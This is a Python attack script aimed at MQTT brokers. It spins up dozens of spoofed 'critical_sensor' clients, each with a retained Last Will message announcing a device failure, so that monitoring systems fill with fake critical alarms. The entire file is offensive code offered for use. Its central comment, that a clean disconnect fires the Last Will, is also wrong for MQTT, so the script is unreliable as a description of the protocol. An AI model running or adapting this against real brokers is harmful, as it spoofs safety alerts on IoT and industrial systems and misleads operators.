#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import os
import sys
import time

def lwt_abuse_attack(broker, port, client_num):
    client = mqtt.Client(client_id=f"critical_sensor_{client_num}")
    client.username_pw_set(os.getenv("MQTT_USER", "attacker"), os.getenv("MQTT_PASS", "attackerpass"))
    
    # Configure a fake Last Will to look like a critical device.
    lwt_message = f'{{"device":"sensor_{client_num}","status":"DEVICE_FAILURE","battery":0}}'
    client.will_set("alerts/device/failure", lwt_message, qos=2, retain=True)
    
    # Connect and disconnect abruptly to trigger the LWT.
    client.connect(broker, port, 60)
    time.sleep(0.5)
    client.disconnect()  # Dispara Last Will Testament
    
    print(f"[!] LWT triggered for fake device: critical_sensor_{client_num}")

if __name__ == "__main__":
    broker = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
    count = int(os.getenv("COUNT", "50"))
    delay_ms = int(os.getenv("DELAY_MS", "100"))
    
    # Create 50 fake critical devices that disappear.
    for i in range(count):
        lwt_abuse_attack(broker, port, i)
        if delay_ms > 0:
            time.sleep(delay_ms / 1000)
    
    print("[✓] Last Will Testament abuse completed")
